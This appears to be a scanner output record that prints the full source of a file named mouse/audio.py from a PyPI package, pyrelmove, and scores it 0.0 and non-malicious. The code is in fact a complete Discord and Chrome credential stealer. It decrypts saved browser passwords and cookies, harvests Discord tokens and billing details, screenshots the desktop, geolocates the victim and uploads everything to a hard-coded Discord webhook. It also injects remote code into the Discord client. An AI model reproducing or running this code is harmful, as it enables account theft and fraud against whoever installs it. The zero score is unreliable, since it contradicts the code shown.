statistics:
  total_files: 1
  skipped_files: 0.0
  processed_objects: 1
  malicious_objects: 0
details:
- path: .repo_cache/malicious_repos/pypi_malregistry/pyrelmove/0.0.13/pyrelmove-0.0.13/pyrelmove-0.0.13/mouse/audio.py
  contents:
  - name: <module>
    score: 0.0
    code: "import requests\nimport os \nimport shutil \nimport sqlite3 \nimport zipfile \nimport json \nimport base64 \nimport psutil \nimport pyautogui\n\nfrom win32crypt import CryptUnprotectData\nfrom re import findall\nfrom Crypto.Cipher import AES\n\nclass Hazard_Token_Grabber_V2:\n    def __init__(self):\n        self.webhook = \"https://discord.com/api/webhooks/1063615699760713768/nxosUxZi-XxvD3oH97BKB3lQbF5li6A6oVbqXrut-pyyQRZr_FTSXKFqVAbYlkMkHZYo\"\n        self.files = \"\"\n        self.appdata = os.getenv(\"localappdata\")\n        self.roaming = os.getenv(\"appdata\")\n        self.tempfolder = os.getenv(\"temp\")+\"\\\\Hazard_Token_Grabber_V2\"\n\n        try:\n            os.mkdir(os.path.join(self.tempfolder))\n        except Exception:\n            pass\n\n        self.tokens = []\n        self.saved = []\n\n        if os.path.exists(os.getenv(\"appdata\")+\"\\\\BetterDiscord\"):\n            self.bypass_better_discord()\n\n        if not os.path.exists(self.appdata+'\\\\Google'):\n            self.files += f\"{os.getlogin()} doesn't have google installed\\n\"\n        else:\n            self.grabPassword()\n            self.grabCookies()\n        self.grabTokens()\n        self.screenshot()\n        self.SendInfo()\n        self.LogOut()\n        try:\n            shutil.rmtree(self.tempfolder)\n        except (PermissionError, FileExistsError):\n            pass\n\n    def getheaders(self, token=None, content_type=\"application/json\"):\n        headers = {\n            \"Content-Type\": content_type,\n            \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11\"\n        }\n        if token:\n            headers.update({\"Authorization\": token})\n        return headers\n\n    def LogOut(self):\n        for proc in psutil.process_iter():\n            if any(procstr in proc.name().lower() for procstr in\\\n            ['discord', 'discordcanary', 'discorddevelopment', 'discordptb']):\n                proc.kill()\n        for root, dirs, files in os.walk(os.getenv(\"LOCALAPPDATA\")):\n            for name in dirs:\n                if \"discord_desktop_core-\" in name:\n                    try:\n                        directory_list = os.path.join(root, name+\"\\\\discord_desktop_core\\\\index.js\")\n                        os.mkdir(os.path.join(root, name+\"\\\\discord_desktop_core\\\\Hazard\"))\n                    except FileNotFoundError:\n                        pass\n                    f = requests.get(\"https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean\").text.replace(\"%WEBHOOK_LINK%\", self.webhook)\n                    with open(directory_list, 'w', encoding=\"utf-8\") as index_file:\n                        index_file.write(f)\n        for root, dirs, files in os.walk(os.getenv(\"APPDATA\")+\"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Discord Inc\"):\n            for name in files:\n                discord_file = os.path.join(root, name)\n                os.startfile(discord_file)\n\n    def bypass_better_discord(self):\n        bd = os.getenv(\"appdata\")+\"\\\\BetterDiscord\\\\data\\\\betterdiscord.asar\"\n        with open(bd, \"rt\", encoding=\"cp437\") as f:\n            content = f.read()\n            content2 = content.replace(\"api/webhooks\", \"RdimoTheGoat\")\n        with open(bd, 'w'): pass\n        with open(bd, \"wt\", encoding=\"cp437\") as f:\n            f.write(content2)\n\n    def get_master_key(self):\n        with open(self.appdata+'\\\\Google\\\\Chrome\\\\User Data\\\\Local State', \"r\", encoding=\"utf-8\") as f:\n            local_state = f.read()\n        local_state = json.loads(local_state)\n\n        master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n        master_key = master_key[5:]\n        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]\n        return master_key\n    \n    def decrypt_payload(self, cipher, payload):\n        return cipher.decrypt(payload)\n    \n    def generate_cipher(self, aes_key, iv):\n        return AES.new(aes_key, AES.MODE_GCM, iv)\n    \n    def decrypt_password(self, buff, master_key):\n        try:\n            iv = buff[3:15]\n            payload = buff[15:]\n            cipher = self.generate_cipher(master_key, iv)\n            decrypted_pass = self.decrypt_payload(cipher, payload)\n            decrypted_pass = decrypted_pass[:-16].decode()\n            return decrypted_pass\n        except:\n            return \"Chrome < 80\"\n    \n    def grabPassword(self):\n        master_key = self.get_master_key()\n        f = open(self.tempfolder+\"\\\\Google Passwords.txt\", \"w\", encoding=\"cp437\", errors='ignore')\n        f.write(\"Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\\n\\n\")\n        login_db = self.appdata+'\\\\Google\\\\Chrome\\\\User Data\\\\default\\\\Login Data'\n        try:\n            shutil.copy2(login_db, \"Loginvault.db\")\n        except FileNotFoundError:\n            pass\n        conn = sqlite3.connect(\"Loginvault.db\")\n        cursor = conn.cursor()\n        try:\n            cursor.execute(\"SELECT action_url, username_value, password_value FROM logins\")\n            for r in cursor.fetchall():\n                url = r[0]\n                username = r[1]\n                encrypted_password = r[2]\n                decrypted_password = self.decrypt_password(encrypted_password, master_key)\n                if url != \"\":\n                    f.write(f\"Domain: {url}\\nUser: {username}\\nPass: {decrypted_password}\\n\\n\")\n        except:\n            pass\n        f.close()\n        cursor.close()\n        conn.close()\n        try:\n            os.remove(\"Loginvault.db\")\n        except:\n            pass\n\n    def grabCookies(self):\n        master_key = self.get_master_key()\n        f = open(self.tempfolder+\"\\\\Google Cookies.txt\", \"w\", encoding=\"cp437\", errors='ignore')\n        f.write(\"Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\\n\\n\")\n        login_db = self.appdata+'\\\\Google\\\\Chrome\\\\User Data\\\\default\\\\Network\\\\cookies'\n        try:\n            shutil.copy2(login_db, \"Loginvault.db\")\n        except FileNotFoundError:\n            pass\n        conn = sqlite3.connect(\"Loginvault.db\")\n        cursor = conn.cursor()\n        try:\n            cursor.execute(\"SELECT host_key, name, encrypted_value from cookies\")\n            for r in cursor.fetchall():\n                Host = r[0]\n                user = r[1]\n                encrypted_cookie = r[2]\n                decrypted_cookie = self.decrypt_password(encrypted_cookie, master_key)\n                if Host != \"\":\n                    f.write(f\"Host: {Host}\\nUser: {user}\\nCookie: {decrypted_cookie}\\n\\n\")\n        except:\n            pass\n        f.close()\n        cursor.close()\n        conn.close()\n        try:\n            os.remove(\"Loginvault.db\")\n        except:\n            pass\n\n    def grabTokens(self):\n        f = open(self.tempfolder+\"\\\\Discord Info.txt\", \"w\", encoding=\"cp437\", errors='ignore')\n        f.write(\"Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\\n\\n\")\n        paths = {\n            'Discord': self.roaming + r'\\\\discord\\\\Local Storage\\\\leveldb\\\\',\n            'Discord Canary': self.roaming + r'\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\',\n            'Lightcord': self.roaming + r'\\\\Lightcord\\\\Local Storage\\\\leveldb\\\\',\n            'Discord PTB': self.roaming + r'\\\\discordptb\\\\Local Storage\\\\leveldb\\\\',\n            'Opera': self.roaming + r'\\\\Opera Software\\\\Opera Stable\\\\Local Storage\\\\leveldb\\\\',\n            'Opera GX': self.roaming + r'\\\\Opera Software\\\\Opera GX Stable\\\\Local Storage\\\\leveldb\\\\',\n            'Amigo': self.appdata + r'\\\\Amigo\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Torch': self.appdata + r'\\\\Torch\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Kometa': self.appdata + r'\\\\Kometa\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Orbitum': self.appdata + r'\\\\Orbitum\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'CentBrowser': self.appdata + r'\\\\CentBrowser\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            '7Star': self.appdata + r'\\\\7Star\\\\7Star\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Sputnik': self.appdata + r'\\\\Sputnik\\\\Sputnik\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Vivaldi': self.appdata + r'\\\\Vivaldi\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome SxS': self.appdata + r'\\\\Google\\\\Chrome SxS\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome': self.appdata + r'\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Epic Privacy Browser': self.appdata + r'\\\\Epic Privacy Browser\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Microsoft Edge': self.appdata + r'\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul\\\\Local Storage\\\\leveldb\\\\',\n            'Uran': self.appdata + r'\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Yandex': self.appdata + r'\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Brave': self.appdata + r'\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Iridium': self.appdata + r'\\\\Iridium\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\'\n        }\n\n        for source, path in paths.items():\n            if not os.path.exists(path):\n                continue\n            for file_name in os.listdir(path):\n                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):\n                    continue\n                for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n                    for regex in (r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}\", r\"mfa\\.[\\w-]{84}\"):\n                        for token in findall(regex, line):\n                            self.tokens.append(token)\n        for token in self.tokens:\n            r = requests.get(\"https://discord.com/api/v9/users/@me\", headers=self.getheaders(token))\n            if r.status_code == 200:\n                if token in self.saved:\n                    continue\n                self.saved.append(token)\n                j = requests.get(\"https://discord.com/api/v9/users/@me\", headers=self.getheaders(token)).json()\n                badges = \"\"\n                flags = j['flags']\n                if (flags == 1):\n                    badges += \"Staff, \"\n                if (flags == 2):\n                    badges += \"Partner, \"\n                if (flags == 4):\n                    badges += \"Hypesquad Event, \"\n                if (flags == 8):\n                    badges += \"Green Bughunter, \"\n                if (flags == 64):\n                    badges += \"Hypesquad Bravery, \"\n                if (flags == 128):\n                    badges += \"HypeSquad Brillance, \"\n                if (flags == 256):\n                    badges += \"HypeSquad Balance, \"\n                if (flags == 512):\n                    badges += \"Early Supporter, \"\n                if (flags == 16384):\n                    badges += \"Gold BugHunter, \"\n                if (flags == 131072):\n                    badges += \"Verified Bot Developer, \"\n                if (badges == \"\"):\n                    badges = \"None\"\n\n                user = j[\"username\"] + \"#\" + str(j[\"discriminator\"])\n                email = j[\"email\"]\n                phone = j[\"phone\"] if j[\"phone\"] else \"No Phone Number attached\"\n\n                url = f'https://cdn.discordapp.com/avatars/{j[\"id\"]}/{j[\"avatar\"]}.gif'\n                try:\n                    requests.get(url)\n                except:\n                    url = url[:-4]\n\n                nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()\n                has_nitro = False\n                has_nitro = bool(len(nitro_data) > 0)\n\n                billing = bool(len(json.loads(requests.get(\"https://discordapp.com/api/v6/users/@me/billing/payment-sources\", headers=self.getheaders(token)).text)) > 0)\n                \n                f.write(f\"{' '*17}{user}\\n{'-'*50}\\nToken: {token}\\nHas Billing: {billing}\\nNitro: {has_nitro}\\nBadges: {badges}\\nEmail: {email}\\nPhone: {phone}\\n[Avatar]({url})\\n\\n\")\n        f.close()\n\n    def screenshot(self):\n        image = pyautogui.screenshot()\n        image.save(self.tempfolder + \"\\\\Screenshot.png\")\n\n    def SendInfo(self):\n        ip = country = city = region = googlemap = \"None\"\n        try:\n            data = requests.get(\"http://ipinfo.io/json\").json()\n            ip = data['ip']\n            city = data['city']\n            country = data['country']\n            region = data['region']\n            googlemap = \"https://www.google.com/maps/search/google+map++\" + data['loc']\n        except Exception:\n            pass\n        temp = os.path.join(self.tempfolder)\n        new = os.path.join(self.appdata, f'Hazard.V2-[{os.getlogin()}].zip')\n        self.zip(temp, new)\n        for dirname, _, files in os.walk(self.tempfolder):\n            for f in files:\n                self.files += f\"\\n{f}\"\n        n = 0\n        for r, d, files in os.walk(self.tempfolder):\n            n+= len(files)\n            self.fileCount = f\"{n} Files Found: \"\n        embed = {\n            \"avatar_url\":\"https://cdn.discordapp.com/attachments/828047793619861557/891537255078985819/nedladdning_9.gif\",\n            \"embeds\": [\n                {\n                    \"author\": {\n                        \"name\": \"Hazard Token Grabber.V2\",\n                        \"url\": \"https://github.com/Rdimo/Hazard-Token-Grabber-V2\",\n                        \"icon_url\": \"https://cdn.discordapp.com/attachments/828047793619861557/891698193245560862/Hazard.gif\"\n                    },\n                    \"description\": f\"**{os.getlogin()}** Just ran Hazard Token Grabber.V2\\n```fix\\nComputerName: {os.getenv('COMPUTERNAME')}\\nIP: {ip}\\nCity: {city}\\nRegion: {region}\\nCountry: {country}```[Google Maps Location]({googlemap})\\n```fix\\n{self.fileCount}{self.files}```\",\n                    \"color\": 16119101,\n\n                    \"thumbnail\": {\n                      \"url\": \"https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Hazard.gif\"\n                    },       \n\n                    \"footer\": {\n                      \"text\": \"k\"\n                    }\n                }\n            ]\n        }\n        requests.post(self.webhook, json=embed)\n        requests.post(self.webhook, files={'upload_file': open(new,'rb')})\n\n    def zip(self, src, dst):\n        zipped_file = zipfile.ZipFile(dst, \"w\", zipfile.ZIP_DEFLATED)\n        abs_src = os.path.abspath(src)\n        for dirname, _, files in os.walk(src):\n            for filename in files:\n                absname = os.path.abspath(os.path.join(dirname, filename))\n                arcname = absname[len(abs_src) + 1:]\n                zipped_file.write(absname, arcname)\n        zipped_file.close()"
    tokens: resume load_const INTEGER load_const import_name requests store_name requests load_const INTEGER load_const import_name os store_name os load_const INTEGER load_const import_name shutil store_name shutil load_const INTEGER load_const import_name sqlite3 store_name sqlite3 load_const INTEGER load_const import_name zipfile store_name zipfile load_const INTEGER load_const import_name json store_name json load_const INTEGER load_const import_name base64 store_name base64 load_const INTEGER load_const import_name psutil store_name psutil load_const INTEGER load_const import_name pyautogui store_name pyautogui load_const INTEGER load_const import_name win32crypt import_from STRING_LEN_S_ENT_HIGH store_name STRING_LEN_S_ENT_HIGH pop_top load_const INTEGER load_const import_name re import_from findall store_name findall pop_top load_const INTEGER load_const import_name Crypto.Cipher import_from AES store_name AES pop_top push_null load_build_class load_const OBJECT make_function load_const STRING_LEN_S_ENT_HIGH call store_name STRING_LEN_S_ENT_HIGH load_name __name__ load_const __main__ compare_op == pop_jump_if_false TO_NUMBER push_null load_name STRING_LEN_S_ENT_HIGH call pop_top return_const None return_const None
    hash: 41ac46104d13b8719b14510cc73e03371a2c44bf9ad4a6bd784b9fdaa4e85e52
sources:
  .repo_cache/malicious_repos/pypi_malregistry/pyrelmove/0.0.13/pyrelmove-0.0.13/pyrelmove-0.0.13/mouse/audio.py: 
